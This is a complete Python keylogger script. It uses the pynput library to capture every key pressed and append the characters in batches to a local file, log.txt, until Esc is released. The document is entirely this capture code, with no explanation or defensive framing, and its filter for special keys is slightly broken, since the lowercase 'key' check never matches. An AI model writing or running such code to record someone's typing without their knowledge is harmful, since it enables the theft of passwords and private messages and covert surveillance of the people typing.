from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count >= 10:
        write_to_file(keys)
        count = 0
        keys = []

def write_to_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = key.replace("'", "")
            if key == 'Key.space':
                k = " "
            elif key.find("key") > 0:
                k = ""
            f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()